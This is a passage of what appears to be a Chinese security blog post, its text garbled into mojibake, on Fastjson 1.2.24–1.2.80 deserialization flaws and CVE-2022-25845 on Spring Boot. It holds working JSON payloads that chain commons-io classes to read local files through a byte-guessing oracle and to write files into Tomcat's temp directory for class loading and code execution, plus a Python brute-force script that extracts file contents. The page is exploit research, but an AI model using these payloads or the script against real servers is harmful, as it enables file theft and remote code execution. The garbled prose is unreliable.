â€œbâ€:{â€¦. â€œconnectionâ€:{} }, â€œcâ€:{ â€œ@typeâ€:â€œjava.sql.Connectionâ€, â€œ@typeâ€:â€œorg.postgresql.jdbc.PgConnectionâ€, â€¦ } }\nå…³äºfieldè¿›è¡Œå®ä¾‹åŒ–è¿™ä¸ªç‰¹æ€§JavaBeanDeserializeråŒæ ·å­˜åœ¨ï¼Œåˆå§‹åŒ–å®Œå‚æ•°åPgConnectionè°ƒç”¨è‡ªè´­æ–¹æ³•ï¼Œè§¦å‘jdbc\nä¿®å¤ https://github.com/alibaba/fastjson/commit/35db4adad70c32089542f23c272def1ad920a60d https://github.com/alibaba/fastjson/commit/8f3410f81cbd437f7c459f8868445d50ad301f15 é™¤äº†é»‘ç™½åå•çš„å˜åŒ–ä»¥å¤–å°±æ˜¯ç›´æ¥ç«¯æ‰å¼‚å¸¸ç±»è¿™æ¡è·¯ã€‚\nå¹¶ä¸”åœ¨åŠ ç±»ç¼“å­˜æ—¶å¤šäº†ä¸€æ¬¡autotypeåˆ¤æ–­\nexpectClasså’ŒjsonTypeéƒ½éœ€è¦å¼€å¯\nCVE-2022-25845 https://github.com/luelueking/CVE-2022-25845-In-Spring\nhttps://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf\nè¿™é‡Œç”¨çš„@1ueå¸ˆå‚…çš„pocï¼Œè·Ÿè®®ä¼šä¸Šçš„pocæ„é€ å¯èƒ½æœ‰ç‚¹å·®å¼‚å§ï¼Œä¸è¿‡åˆ©ç”¨ç‚¹æ˜¯ä¸€æ ·çš„\nè¿™ä¸ªåˆ©ç”¨åœ¨1.2.80é‡Œæˆ‘è§‰å¾—æ˜¯å®ç”¨æ€§å¾ˆå¥½çš„pocäº†ï¼Œè¿™é‡Œä¸»è¦éœ€è¦3ä¸ªä¾èµ–å§\ncommons-io //ç”¨æ¥è¯»å†™æ–‡ä»¶ fastjson //ä¸ç”¨å¤šè¯´ï¼Œè§¦å‘åˆ©ç”¨ springboot //è¿™ä¸ªå…¶å®æ˜¯å› ä¸ºä¼šå¯åŠ¨æ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªtomcatçš„ä¸´æ—¶ç›®å½•ï¼Œè€ŒTomcatEmbeddedWebappClassLoaderåŠ è½½Classæ—¶ï¼Œä¼šåœ¨ä¸Šè¿°ç›®å½•å¯¹åº”è·¯å¾„ä¸‹æŸ¥æ‰¾classæ–‡ä»¶ï¼Œå­˜åœ¨çš„è¯å°±ä¼šåŠ è½½è¿™ä¸ªclassæ–‡ä»¶è§¦å‘staticå—ä»£ç æ‰§è¡Œ æ‰€ä»¥è¿™ä¸‰ä¸ªä¾èµ–å°±é€ å°±è¿™ä¸ªamazingçš„åˆ©ç”¨\nput java.io.InputStream ä¾¿äºåç»­çš„è°ƒç”¨ å› ä¸ºtomcatè¿™ä¸ªç›®å½•åï¼Œå¹¶ä¸æ˜¯å›ºå®šçš„ï¼Œè€Œæ˜¯éšæœºçš„ï¼Œä½†æ˜¯åœ¨javaä¸­fileåè®®å¯ä»¥ç”¨æ¥éå†ç›®å½•æ‰€ä»¥è¿™é‡Œæˆ‘å¯ä»¥é€šè¿‡file:///tmpæ‰¾åˆ°ç”Ÿæˆtomcatä¸´æ—¶ç›®å½•çš„åå­— åŠå†™å…¥æ„é€ å¥½çš„classæ–‡ä»¶åˆ°tomcatä¸´æ—¶ç›®å½•ä¸‹ï¼Œä¸”è¿™ä¸ªå¯ä»¥è§£å†³ç›®å½•åˆ›å»ºçš„é—®é¢˜ é€šè¿‡fastjsonè§¦å‘classåŠ è½½ï¼Œè§¦å‘static{}æ‰§è¡Œ //è¿™é‡ŒfastjsonåŠ è½½ç±»æ—¶ï¼Œä¼šç”¨åˆ°TomcatEmbeddedWebappClassLoaderåŠ è½½ï¼Œæ‰€ä»¥èƒ½åŠ è½½tomcatä¸´æ—¶ç›®å½•çš„classã€‚éƒ½æ˜¯ç¯ç¯ç›¸æ‰£çš„åˆ©ç”¨ï¼ŒæŒºæœ‰æ„æ€çš„ Step1: put java.io.InputStream { \"a\": \"{ \\\"@type\\\": \\\"java.lang.Exception\\\", \\\"@type\\\": \\\"com.fasterxml.jackson.core.exc.InputCoercionException\\\", \\\"p\\\": { } }\", \"b\": { \"$ref\": \"$.a.a\" }, \"c\": \"{ \\\"@type\\\": \\\"com.fasterxml.jackson.core.JsonParser\\\", \\\"@type\\\": \\\"com.fasterxml.jackson.core.json.UTF8StreamJsonParser\\\", \\\"in\\\": {}}\", \"d\": { \"$ref\": \"$.c.c\" } } è¿™é‡Œè§£é‡Šä¸‹pocæ„é€ å†™æ³•å§ï¼Œå¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯\"a\":\"...\"è¿™ç§è€Œä¸æ˜¯\"a\":{...}ï¼Œä¸ºä»€ä¹ˆè¿™æ ·æ„é€ å‘¢ï¼ˆæµ‹è¯•ä¸¤ç§pocéƒ½æ˜¯èƒ½putæˆåŠŸçš„ï¼‰ï¼Œæ„Ÿè§‰æ˜¯å¾®æ“(å°±æ˜¯ä¸æŠ¥é”™ï¼Œè®°å½•æ—¥å¿—çš„æ—¶å€™æ˜¯æ­£å¸¸çš„ï¼Œå¯ä»¥çœ‹åˆ°ä½œè€…çš„pocæ˜¯200ï¼Œè€Œé€šå¸¸çš„åˆ©ç”¨æ˜¯500ï¼ˆå¦‚æœæ˜ç™½è¿™ä¸ªç‰¹å¾æ‰¾æ—¥å¿—å°±å¾ˆå¥½å®šä½\n200\n500\n$refçš„åˆ©ç”¨ ç®€è¿°ï¼šé€šè¿‡parse.parse()ä¼šè¿˜åŸæˆä¸€ä¸ªmap{String,String},ç„¶åparser.handleResovleTask(value);ä¼šå»æŸ¥æ‰¾å…¶ä¸­çš„$refå¹¶è¿›è¡Œè°ƒç”¨ï¼Œ$.aå¾ˆå¥½ç†è§£å°±æ˜¯è·å–åˆ°{â€œaâ€:\"â€¦â€œå¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œè€Œ$.a.aå°±æ˜¯åˆ©ç”¨çš„å…³é”®ï¼Œåœ¨å¯»æ‰¾æ—¶ä¼šåˆ¤æ–­$.açš„ç±»å‹ï¼Œæ˜¯Stringçš„è¯ä¼šè¿›è¡ŒJSON.parse()ååºåˆ—åŒ–å…¶å€¼ï¼Œï¼ˆæ­£å¸¸æƒ…å†µæ˜¯å¾—åˆ°ä¸€ä¸ªmapç„¶åå†åœ¨è¿™ä¸ªmapä¸­è·å–$.a.{a}{}ä¸­è¿™ä¸ªå€¼(è¿™é‡Œæ˜¯a)ã€‚è€Œæˆ‘ä»¬è¿™JSON.parse()ä¼šcatchï¼ˆè¿™é‡Œç›¸å…³å¤„ç†æ˜¯{}è·³è¿‡ï¼‰ï¼Œç„¶ååç»­å¤„ç†ä¹Ÿæ²¡èµ‹ä¸Šå€¼â€“\u003eæœ€åreturn nullã€‚$.a.aå³æ˜¯nullï¼Œ\nsoï¼šè¿™é‡Œ$.a.aå¯ä»¥æ˜¯$.a.{ä»»ä½•å€¼}ï¼Œåªæ˜¯ç”¨æ¥è§¦å‘$.açš„ååºåˆ—åŒ–\nhandleResovleTaskè°ƒç”¨$ref\nç¬¬ä¸€æ¬¡è¿›å…¥getPropertyValue()ï¼ŒæŸ¥æ‰¾$.aï¼Œå½“å‰currentObjectå¯¹åº”æ•´ä¸ªjson{â€œaâ€,â€¦}(å³$)\nç¬¬äºŒæ¬¡è¿›å…¥getPropertyValue()ï¼ŒæŸ¥æ‰¾$.a.aï¼ŒcurrentObjectå¯¹åº”$.aï¼ŒJSON.parse()è§¦å‘åˆ©ç”¨\nStep2ï¼šæ–‡ä»¶è¯»å– getBom() çœ‹è¿™ä¸ªä¹‹å‰å¯ä»¥å…ˆçœ‹çœ‹è¿™ç¯‡ï¼Œæ ¸å¿ƒåˆ©ç”¨getBom()\nhttps://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ\nåˆ©ç”¨éœ€è¦çŸ¥é“getBom()çš„è¿”å›å€¼ï¼Œç„¶åæµ…è“è¿™é‡Œä¸¾ä¾‹äº†å‡ ç§å¯èƒ½çš„åœºæ™¯æ„Ÿè§‰æŒºä¸é”™çš„\nä¸€å¤„ä¿®æ”¹æ˜µç§°nameçš„åŠŸèƒ½ï¼Œé€šè¿‡refå°†getBom()çš„è¿”å›å€¼èµ‹äºˆnameï¼Œç„¶åæŸ¥çœ‹nameå€¼ï¼Œåˆ¤æ–­è¯»å–å†…å®¹\nåŒä¸Šï¼Œä½†æ˜¯åˆ¤æ–­èµ‹å€¼ä¸ºç©ºæ—¶æŠ¥é”™ï¼Œä¸ä¸ºç©ºæ­£å¸¸ï¼Œå¸ƒå°”åˆ¤æ–­äº†\næ²¡æœ‰ä¸Šè¿°è¿™ç§å¥½ç”¨çš„nameè§‚å¯Ÿç‚¹äº†ï¼Œé€šè¿‡ç±»å‹é”™è¯¯å¯¼è‡´fastjsonæŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™åˆ¤æ–­ï¼Œ\"java.lang.String\"{\"$ref\":\"$.abc.BOM[0]\"}ï¼Œnullæ—¶ä¸æŠ¥é”™ï¼Œæ¯”å¯¹æˆåŠŸæ—¶è¿”å›ç±»å‹é”™è¯¯æŠ¥é”™\næ²¡æœ‰ä»»ä½•æŠ¥é”™å›æ˜¾æ—¶ï¼Œå¯ä»¥åœ¨ç±»å‹åˆ¤æ–­åé¢å¢åŠ ä¸€ä¸ªdnslogï¼ŒæŠ¥é”™æ—¶å¼‚å¸¸å¯¼è‡´åé¢çš„dnslogè¯·æ±‚ä¸äº†ï¼ˆä½†æ˜¯å®æˆ˜çš„è¯æ„Ÿè§‰å¾ˆé¸¡è‚‹ï¼‰\nä¸è¿‡è¿™ç§æ€è·¯åœ¨ç‰ˆæœ¬æ¢æµ‹æ•ˆæœè¿˜ä¸é”™ï¼Œå°±æ˜¯å¼•ç”¨å‡ ä¸ªå…³é”®ç‰ˆæœ¬ç‚¹å½¢æˆçš„pocè¿›è¡Œdnslogè¯·æ±‚ï¼ˆå…·ä½“å¯ä»¥çœ‹@su18æ€»ç»“çš„\n{ \"a\": { \"@type\": \"java.io.InputStream\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///C:/Windows/win.ini\" }, \"charsetName\": \"UTF-8\", \"bufferSize\": \"1024\" }, \"boms\": [ { \"charsetName\": \"UTF-8\", \"bytes\": [59,32,102] } ] }, \"boms\": [ { \"charsetName\": \"UTF-8\", \"bytes\": [1] } ] }, \"b\": {\"$ref\":\"$.a.delegate\"} } é€šè¿‡çˆ†ç ´æ¯”å¯¹ä½æ•°æ®è¿›è¡Œè·å–çš„\nåœ¨parse.parse()ååºåˆ—åŒ–åï¼Œè®¾ç½®Responseå€¼æ—¶å»è·å–BOMå€¼ï¼Œè§¦å‘getBOM()ï¼Œç„¶åä¼šå’Œin(ReaderInputStream)è¯»å–åˆ°çš„å€¼å’ŒåŸæœ¬è®¾ç½®çš„bomsè¿›è¡Œæ¯”å¯¹ï¼Œå…¨éƒ¨ä¸€è‡´åˆ™ä¼šè¿”å›å…¶byte[]ï¼Œå¦åˆ™è¿”å›null\nè¿™ä¹Ÿå°±èƒ½é€šè¿‡Responseåˆ¤æ–­æ–‡ä»¶å†…å®¹äº†\nä½†æ˜¯å…¶å®æ²¡å¿…è¦å¤šå¥—ä¸€å±‚å•Šï¼Œæœ¬èº«å°±èƒ½é€šè¿‡$refè§¦å‘getBom()ï¼Œä¸”èƒ½è¿”å›å¯¹åº”å›æ˜¾\n{ \"a\": { \"@type\": \"java.io.InputStream\", \"@type\": \"org.apache.commons.io.input.BOMInputStream\", \"delegate\": { \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"jdk.nashorn.api.scripting.URLReader\", \"url\": \"file:///C:/Windows/win.ini\"//${file} }, \"charsetName\": \"UTF-8\", \"bufferSize\": \"1024\" }, \"boms\": [ { \"charsetName\": \"UTF-8\", \"bytes\": [59,32,102]//${data} } ] }, \"b\": {\"$ref\":\"$.a.BOM\"} } å› ä¸ºéœ€è¦çˆ†ç ´ç›®å½•ï¼Œæ‰‹æµ‹æœ‰ç‚¹éº»çƒ¦ï¼Œè¿˜æ˜¯è®©aiå†™äº†ä¸ªè„šæœ¬\nfrom concurrent.futures import ThreadPoolExecutor import requests import sys session = requests.Session() def send_request(target_url, char_code): boundary = \"----WebKitFormBoundaryROOGnnZjMDt56Gw0\" headers = { \"Host\": \"127.0.0.1:8080\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Connection\": \"close\", \"Content-Type\": f\"multipart/form-data; boundary={boundary}\", } payload = ( f'--{boundary}\\r\\n' 'Content-Disposition: form-data; name=\"json\"\\r\\n\\r\\n' '{\\n' ' \"a\": {\\n' ' \"@type\": \"java.io.InputStream\",\\n' ' \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\\n' ' \"delegate\": {\\n' ' \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\\n' ' \"reader\": {\\n' ' \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\\n' f' \"url\": \"{target_url}\"\\n' ' },\\n' ' \"charsetName\": \"UTF-8\",\\n' ' \"bufferSize\": \"1024\"\\n' ' },\\n' ' \"boms\": [\\n' ' {\\n' ' \"charsetName\": \"UTF-8\",\\n' f' \"bytes\": [{char_code}]\\n' ' }\\n' ' ]\\n' ' },\\n' ' \"b\": {\"$ref\":\"$.a.BOM\"}\\n' '}\\r\\n' f'--{boundary}--\\r\\n' ) try: response = session.post( \"http://127.0.0.1:8080/json\", headers=headers, data=payload, timeout=5 ) return response.text except Exception as e: print(f\"Error sending request: {e}\") return None common_codes = list(range(48, 58)) + list(range(65, 91)) + list(range(97, 123)) other_codes = [c for c in range(256) if c not in common_codes] ordered_codes = common_codes + other_codes # ä¼˜å…ˆå¸¸è§å­—ç¬¦ï¼Œç„¶åæµ‹è¯•å…¶ä»–å­—ç¬¦ def brute_force_chars(target_url): valid_chars = \"\" with ThreadPoolExecutor(max_workers=50) as executor: # å¯æ ¹æ®ç½‘ç»œæƒ…å†µè°ƒæ•´çº¿ç¨‹æ•° while True: futures = {} for code in ordered_codes: full_code = valid_chars + str(code) futures[executor.submit(send_request, target_url, full_code)] = code found = False for future in futures: code = futures[future] try: response_text = future.result() if response_text and '\"b\":null' not in response_text: valid_chars += str(code) + \",\" print(valid_chars) found = True break except: continue if not found: bytes_list = [int(b) for b in valid_chars.split(\",\") if b.strip()] print(\"Final result:\", \"\".join(chr(b) for b in bytes_list)) exit(0) if __name__ == \"__main__\": # if len(sys.argv) != 2: # print(\"Usage: python exploit.py \") # print(\"Example: python exploit.py file:///C:/Windows/win.ini\") # sys.exit(1) # target_url = sys.argv[1] brute_force_chars(\"file:///C:/Users\") # brute_force_chars(target_url) ä½†æ˜¯åœ¨windowç¯å¢ƒä¸‹æ„Ÿè§‰æœ‰ç‚¹ç¾éš¾ï¼Œå› ä¸ºæˆ‘æœ¬åœ°ç¯å¢ƒä¸‹Tempçš„ç›®å½•å¤ªå¤šäº†ï¼ŒæŸ¥çœ‹äº†ç¿»ä»£ç å¸Œæœ›è¾¾åˆ°.../Temp/tomcat.*åŒ¹é…tomcatå¼€å¤´æ–‡ä»¶ï¼ˆæ— æœï¼‰\nStep3: å†™å…¥æ–‡ä»¶ è¿™é‡Œæˆ‘åŠ äº†å‡ å¤„charsetNameï¼Œä¸ç„¶æˆ‘ç¯å¢ƒä¼šæŠ¥é”™ç¼ºå°‘charset Name\n{ \"a\": { \"@type\": \"java.io.InputStream\", \"@type\": \"org.apache.commons.io.input.AutoCloseInputStream\", \"in\": { \"@type\": \"org.apache.commons.io.input.TeeInputStream\", \"input\": { \"@type\": \"org.apache.commons.io.input.CharSequenceInputStream\", \"cs\": { \"@type\": \"java.lang.String\" \"1234\",//${shellcode} \"charset\": \"iso-8859-1\", \"bufferSize\": 4 //${size} }, \"branch\": { \"@type\": \"org.apache.commons.io.output.WriterOutputStream\", \"writer\": { \"@type\": \"org.apache.commons.io.output.LockableFileWriter\", \"file\": \"./test3\",//${filename} \"charsetName\": \"UTF-8\", \"charset\": \"iso-8859-1\", \"append\": true }, \"charsetName\": \"UTF-8\", \"charset\": \"iso-8859-1\", \"bufferSize\": 1024, \"writeImmediately\": true }, \"closeBranch\": true } }, \"b\": { \"@type\": \"java.io.InputStream\", \"@type\": \"org.apache.commons.io.input.ReaderInputStream\", \"reader\": { \"@type\": \"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\": { \"$ref\": \"$.a\" }, \"httpContentType\": \"text/xml\", \"lenient\": false, \"defaultEncoding\": \"iso-8859-1\" }, \"charsetName\": \"iso-8859-1\", \"bufferSize\": 1024 }, \"c\": {} } åˆ©ç”¨å›¾\nåˆ©ç”¨è°ƒç”¨å¦‚ä¸Šï¼Œç»†è¯´æ„Ÿè§‰ä¹Ÿæè¿°ä¸å‡ºæ¥ï¼Œç„¶åæœ‰å‡ ä¸ªç‚¹è¦è¯´ä¸‹\nLockableFileWriter fileè¿™é‡Œåˆå§‹åŒ–æ—¶ï¼Œä¼šå¸®æˆ‘ä»¬åˆ›å»ºç›®å½•ï¼Œä¸€èˆ¬æƒ…å†µä¸‹tomcat-docbase.xxxè¿™ä¸ªç›®å½•ä¸‹æ˜¯æ²¡æœ‰WEB-INF/classes,è¿™ä¸ªç›®å½•éœ€è¦æˆ‘ä»¬æ¥åˆ›å»ºï¼Œè€Œè¿™é‡ŒLockableFileWriterç›´æ¥è§£å†³äº†è¿™ä¸ªé—®é¢˜ poc ä¸­ $ref \"@type\": \"org.apache.commons.io.input.XmlStreamReader\", \"inputStream\": { \"$ref\": \"$.a\" } åœ¨XmlStreamReaderåˆå§‹åŒ–æ—¶ï¼ŒinputStreamå¯ä»¥ç›´æ¥è·å–åˆ°$.açš„å€¼ï¼Œè€Œä¸ä¸æ˜¯ç­‰åˆ°ååºåˆ—åŒ–å®Œï¼Œåœ¨å¯¹$refçš„é‚£ç§è°ƒç”¨\næœ€åä¸€ä¸ªå³æ˜¯å†™å…¥æ–‡ä»¶çš„å‘å§ï¼Œæˆ‘æœ¬åœ°è°ƒè¯•æ˜¯ä¸€æ¬¡æœ€å¤šå†™å…¥**15**ä¸ªå­—ç¬¦ï¼Œåç»­å†™å…¥å¯ä»¥è¿½åŠ å†™å…¥åˆ°æ–‡ä»¶é‡Œã€‚ä½†æ˜¯æˆ‘çœ‹@1ueçš„pocæ˜¯20ä¸ªï¼Œä½†æ˜¯åœ¨æˆ‘æœ¬åœ°ç¯å¢ƒè°ƒè¯•æ¥çœ‹æ˜¯ä¸è¡Œçš„ã€‚ ä¼šè°ƒç”¨2æ¬¡TeeInputStream#readï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”¨äºå†™å…¥ï¼Œç¬¬äºŒæ¬¡æ˜¯ç”¨äºè¿”å›EOFè¾¾åˆ°close()æ–‡ä»¶çš„æ•ˆæœ\nåé¢å‘ç°ä¸€æ¬¡å†™å…¥è¿‡å¤šæ—¶ï¼Œä¸ä»…æ²¡æœ‰å­—ç¬¦å†™å…¥ï¼Œå†™å…¥å¯¹åº”çš„æ–‡ä»¶ä¹Ÿæ“ä½œä¸äº†ï¼ˆæ€€ç–‘æ˜¯ä¸€ç›´å¤„äºopençŠ¶æ€äº†ï¼Œæ²¡closeï¼‰ï¼Œåªèƒ½å†™å…¥æ–°çš„æ–‡ä»¶\nè°ƒè¯•å‘ç°æ˜¯æ²¡æœ‰è¿›è¡Œclose(),åç»­å‘ç°æ˜¯è·ŸgetBOM()è¿™é‡Œæœ‰å…³ï¼Œæ³¨æ„è¿™é‡Œçš„maxBomSizeè¿™ä¸ªå€¼æ˜¯ä½œä¸ºä¸‹æ–¹forçš„lengthã€‚\næ¥ç€ä¸‹å›¾1in.read()è¿™é‡Œè¯»å–æ¯ä¸ªå€¼ï¼Œè¶…è¿‡4ä¸ªå€¼åå›åˆ°ä¸‹å›¾2ä¸­è·å–å¯¹åº”çš„å€¼ï¼Œæ¯æ¬¡posä¼š+1ã€‚countåˆ™æ˜¯æˆ‘ä»¬å†™å…¥å­—ç¬¦çš„é•¿åº¦ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦è¿›å…¥fill()ï¼ˆé‡Œé¢åç»­ä¼šè°ƒç”¨TeeInputStream#readè¿›è¡Œclose()å…³é—­æµï¼‰ã€‚è€Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°å¦‚æœcountè¿™é‡Œè¶…è¿‡**15ï¼Œå›¾1forèµ°å®Œposæœ€å¤šä¸º15å°±ä¼šå¯¼è‡´è¿›å…¥ä¸äº†fill()**ï¼Œå¯¼è‡´æ²¡æœ‰close()\nå›¾1\nå›¾2\nç„¶åå°±æ˜¯å…¶å®æ˜¯éœ€è¦è°ƒç”¨ä¸¤æ¬¡getBOM()çš„ï¼Œè€Œ$refæˆ‘çŒœæµ‹åº”è¯¥åªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œè€ŒXmlStreamReaderåˆå§‹åŒ–æ­£å¥½èƒ½è°ƒç”¨ä¸¤æ¬¡getBOM() Step4 åŠ è½½class çœ‹å®Œæ„Ÿè§‰è¿™ä¸ªåˆ©ç”¨æ„é€ ï¼Œç»†æ€ææã€‚æŒ–æ˜å»è¿™ä¸ªæ„é€ çš„ä½¬å¤ªçŒ›äº†!^!\nFeature(ç»“è®º): æ‘˜å–äº https://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d\nå…³äºgetterå’Œsetter getterè‡ªåŠ¨è°ƒç”¨æ¡ä»¶ï¼š æ–¹æ³•åé•¿åº¦å¤§äº4 éé™æ€æ–¹æ³• ä»¥getå¼€å¤´ä¸”ç¬¬å››ä¸ªå­—æ¯ä¸ºå¤§å†™ æ— å‚æ•°ä¼ å…¥ è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollection Map AtomicBoolean AtomicInteger AtomicLong setterè‡ªåŠ¨è°ƒç”¨éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š æ–¹æ³•åé•¿åº¦å¤§äº4 éé™æ€æ–¹æ³• è¿”å›å€¼ä¸ºvoidæˆ–è€…å½“å‰ç±» ä»¥setå¼€å¤´ä¸”ç¬¬å››ä¸ªå­—æ¯ä¸ºå¤§å†™ å‚æ•°ä¸ªæ•°ä¸º1ä¸ª å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰setteræ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨Feature.SupportNonPublicFieldå‚æ•° fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾getter/setteræ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•°com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()æ–¹æ³•ï¼Œä¼šå¿½ç•¥_ -å­—ç¬¦ä¸² fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœFieldç±»å‹ä¸ºbyte[]ï¼Œå°†ä¼šè°ƒç”¨com.alibaba.fastjson.parser.JSONScanner#bytesValueè¿›è¡Œbase64è§£ç ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œbase64ç¼–ç  ç‰ˆæœ¬æ¢æµ‹ https://github.com/su18/hack-fastjson-1.2.80\nå‚è€ƒï¼š\nhttps://vidar-team.feishu.cn/docx/KGRNdoGJHocjE1xOEdzcxHH1n9d\nhttps://www.anquanke.com/post/id/232774#h3-18\nhttps://github.com/luelueking/CVE-2022-25845-In-Spring\nhttps://tttang.com/archive/1579/#toc_1268\nhttps://github.com/LeadroyaL/fastjson-blacklist\nhttps://github.com/su18/hack-fastjson-1.2.80\nhttps://y4er.com/posts/fastjson-1.2.80/\nhttps://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ\nè®®ä¼š\nhttps://github.com/knownsec/KCon/blob/master/2022/Hacking%20JSON%E3%80%90KCon2022%E3%80%91.pdf\nhttps://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf\n",
  "wordCount" : "9254",
  "inLanguage": "zh",
  "datePublished": "2025-06-01T20:01:23+08:00",
  "dateModified": "2025-06-01T20:01:23+08:00",
  "author":{
    "@type": "Person",
    "name": "Jiecub3"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Jiecub3",
    "logo": {
      "@type": "ImageObject",
      "url": "https://Jiecub3.github.io/img/logo.gif"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://Jiecub3.github.io/zh/" accesskey="h" title="Jiecub3 (Alt + H)">Jiecub3</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://Jiecub3.github.io/zh/" title="é¦–é¡µ">
                    <span>é¦–é¡µ</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/categories/" title="åˆ†ç±»">
                    <span>åˆ†ç±»</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/search" title="æœç´¢ğŸ”ï¸">
                    <span>æœç´¢ğŸ”ï¸</span>
                </a>
            </li>
            <li>
                <a href="https://Jiecub3.github.io/zh/about/" title="å…³äº">
                    <span>å…³äº</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://Jiecub3.github.io/zh/">ğŸ ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href="https://Jiecub3.github.io/zh/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      Fastjson1.2.24-1.2.80 ååºåˆ—åŒ–
    </h1>
    <div class="post-meta"><span title='2025-06-01 20:01:23 +0800 CST'>2025-06-01</span>&nbsp;Â·&nbsp;19 åˆ†é’Ÿ&nbsp;Â·&nbsp;Jiecub3

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">ç›®å½•</span>
            </summary>

            <div class="inner"><ul><ul>
                    <li>
                        <a href="#12241247" aria-label="1.2.24~1.2.47">1.2.24~1.2.47</a><ul>
                            
                    <li>
                        <a href="#1224" aria-label="1.2.24">1.2.24</a></li>
                    <li>
                        <a href="#12251241" aria-label="1.2.25~1.2.41"><strong>1.2.25~1.2.41</strong></a></li>
                    <li>
                        <a href="#1242" aria-label="1.2.42"><strong>1.2.42</strong></a></li>
                    <li>
                        <a href="#1243" aria-label="1.2.43">1.2.43</a></li>
                    <li>
                        <a href="#1247%e9%80%9a%e6%9d%80" aria-label="&amp;lt;1.2.47(é€šæ€!!!)"><strong>&lt;1.2.47(é€šæ€!!!)</strong></a></li></ul>
                    </li>
                    <li>
                        <a href="#12481268" aria-label="1.2.48~1.2.68">1.2.48~1.2.68</a><ul>
                            
                    <li>
                        <a href="#1267%e5%88%86%e6%9e%90%e4%b8%80%e6%9d%a1%e9%93%be%e5%ad%90" aria-label="1.2.67åˆ†æä¸€æ¡é“¾å­">1.2.67åˆ†æä¸€æ¡é“¾å­</a><ul>
                            
                    <li>
                        <a href="#%e5%be%aa%e7%8e%af%e5%bc%95%e7%94%a8-ref" aria-label="å¾ªç¯å¼•ç”¨ $ref">å¾ªç¯å¼•ç”¨ $ref</a></li></ul>
                    </li>
                    <li>
